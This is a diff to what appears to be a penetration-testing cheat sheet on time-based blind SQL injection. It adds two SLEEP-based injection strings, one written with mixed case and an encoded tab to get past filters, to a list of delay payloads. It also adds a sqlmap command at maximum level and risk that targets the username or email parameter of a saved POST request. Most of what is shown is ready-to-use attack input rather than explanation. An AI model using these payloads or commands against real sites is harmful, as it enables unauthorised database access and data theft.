@@ -4,6 +4,8 @@ For example: if the GET parameter ?username=Peter returns the same content as ?u
 
 
 ```
+orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+(SlEeP%09(14-(5-2)))
 ')) or sleep(5)=' 
 ;waitfor delay '0:0:5'-- 
 );waitfor delay '0:0:5'-- 
@@ -52,3 +54,4 @@ and the server get DELAY for 5 s
 2)
 save Post request in txt
 sqlmap -r txt -p user --force-ssl --level 5 --risk 3
+sqlmap -r request.txt -p email/username --force-ssl -level 5 --risk 3 --dbms="MySQL" --test-filter="MySQL >= 5.0.12 AND time-based blind (query SLEEP)"
